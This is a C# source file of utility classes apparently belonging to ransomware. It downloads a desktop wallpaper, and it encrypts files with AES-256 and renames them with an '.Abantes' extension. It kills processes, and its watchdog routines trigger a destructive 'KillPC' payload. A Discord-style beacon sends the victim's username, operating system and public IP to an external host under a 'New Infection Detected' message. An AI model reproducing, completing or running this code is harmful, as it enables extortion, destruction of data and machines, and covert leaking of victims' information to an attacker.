﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Cryptography;
using System.Windows.Forms;
using System.Diagnostics;

namespace Agenois.Utils
{
    public sealed class Wallpaper
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        private const int SPI_SETDESKWALLPAPER = 20;
        private const int SPIF_SENDWININICHANGE = 2;
        private const int SPIF_UPDATEINIFILE = 1;
        public static void Set(Uri uri, Style style)
        {
            int num;
            string filename = Path.Combine(Path.GetTempPath(), "wallpaper.bmp");
            Image.FromStream(new WebClient().OpenRead(uri.ToString())).Save(filename, ImageFormat.Bmp);
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
            if (style == Style.Stretched)
            {
                num = 2;
                key.SetValue("WallpaperStyle", num.ToString());
                num = 0;
                key.SetValue("TileWallpaper", num.ToString());
            }
            if (style == Style.Centered)
            {
                num = 1;
                key.SetValue("WallpaperStyle", num.ToString());
                num = 0;
                key.SetValue("TileWallpaper", num.ToString());
            }
            if (style == Style.Tiled)
            {
                num = 1;
                key.SetValue("WallpaperStyle", num.ToString());
                key.SetValue("TileWallpaper", 1.ToString());
            }
            SystemParametersInfo(20, 0, filename, 3);
        }
        public enum Style
        {
            Tiled,
            Centered,
            Stretched
        }
    }
    class Encryption
    {
        public static byte[] GenerateRandomSalt()
        {
            byte[] data = new byte[32];
            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                for (int i = 0; i < 10; i++)
                {
                    rng.GetBytes(data);
                }
            }
            return data;
        }
        public static void FileEncrypt(string inputFile, string password)
        {
            byte[] salt = GenerateRandomSalt();
            FileStream fsCrypt = new FileStream(inputFile + ".Abantes", FileMode.Create);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            AES.Padding = PaddingMode.PKCS7;
            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);
            AES.Mode = CipherMode.CFB;
            fsCrypt.Write(salt, 0, salt.Length);
            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write);
            FileStream fsIn = new FileStream(inputFile, FileMode.Open);
            byte[] buffer = new byte[1048576];
            int read;
            try
            {
                while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
                {
                    Application.DoEvents();
                    cs.Write(buffer, 0, read);
                }
                fsIn.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
            finally
            {
                cs.Close();
                fsCrypt.Close();
            }
        }
        public static void FileDecrypt(string inputFile, string outputFile, string password)
        {
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
            byte[] salt = new byte[32];
            FileStream fsCrypt = new FileStream(inputFile, FileMode.Open);
            fsCrypt.Read(salt, 0, salt.Length);
            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);
            AES.Padding = PaddingMode.PKCS7;
            AES.Mode = CipherMode.CFB;
            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateDecryptor(), CryptoStreamMode.Read);
            FileStream fsOut = new FileStream(outputFile, FileMode.Create);
            int read;
            byte[] buffer = new byte[1048576];
            try
            {
                while ((read = cs.Read(buffer, 0, buffer.Length)) > 0)
                {
                    Application.DoEvents();
                    fsOut.Write(buffer, 0, read);
                }
            }
            catch (CryptographicException ex_CryptographicException)
            {
                Console.WriteLine("CryptographicException error: " + ex_CryptographicException.Message);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
            try
            {
                cs.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error by closing CryptoStream: " + ex.Message);
            }
            finally
            {
                fsOut.Close();
                fsCrypt.Close();
            }
        }
    }
    class Others
    {
        public static void StartProcess(string path, string args)
        {
            try
            {
                Process.Start(path, args);
            }
            catch { }
        }
        public static void KillProcess(string processName)
        {
            Process[] process;
            process = Process.GetProcessesByName(processName);
            foreach (Process processKill in process)
            {
                processKill.Kill();
            }
        }
    }
    class WatchDog
    {
        public static void FileWatchDog(string[] sFileName)
        {
            //Put each files path in an array to check if it exists

            foreach (string file in sFileName)
            {
                if (File.Exists(file) == false)
                {
                    Payloads.Destructive.KillPC();
                }
            }
        }
        public static void ProcessWatchDog(string[] sNeverRun, string[] sMustRun)
        {
            //Put each process to watch for in an array to check if it exists

            foreach (string process in sNeverRun)
            {
                Process[] proc = Process.GetProcessesByName(process);
                if (proc.Length > 0)
                {
                    Payloads.Destructive.KillPC();
                }
            }

            foreach (string process in sMustRun)
            {
                Process[] proc = Process.GetProcessesByName(process);
                if (proc.Length == 0)
                {
                    //Not Running
                    Payloads.Destructive.KillPC();
                }
                else
                {
                    //Running
                }
            }
        }
    }
    class Web
    {
        public static void Discord()
        {
            OperatingSystem os = Environment.OSVersion;
            Version vs = os.Version;
            string operatingSystem = "";
            if (os.Platform == PlatformID.Win32NT)
            {
                switch (vs.Major)
                {
                    case 6:
                        if (vs.Minor == 0)
                            operatingSystem = "Windows Vista";
                        else if (vs.Minor == 1)
                            operatingSystem = "Windows 7";
                        else if (vs.Minor == 2)
                            operatingSystem = "Windows 8";
                        else
                            operatingSystem = " Windows 8.1";
                        break;
                    case 10:
                        operatingSystem = "Windows 10";
                        break;
                    default:
                        break;
                }
            }
            string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            string datetime = DateTime.Now.ToString();
            string Is64Bit;
            if (Environment.Is64BitOperatingSystem)
            {
                Is64Bit = "True";
            }
            else
            {
                Is64Bit = "False";
            }
            try
            {
                new WebClient().DownloadString($"http://handyhelper.eu/hook.php?MSG= :computer: **New Infection Detected** :computer: {Environment.NewLine}**Infection Time** = " + datetime + "\n" + "**Operating System** = " + operatingSystem + "\n" + "**64Bit** = " + Is64Bit + "\n" + "**Username** = " + userName + "\n" + "**IP** = " + new WebClient().DownloadString("https://canihazip.com/s"));
            }
            catch { }
        }
    }
}
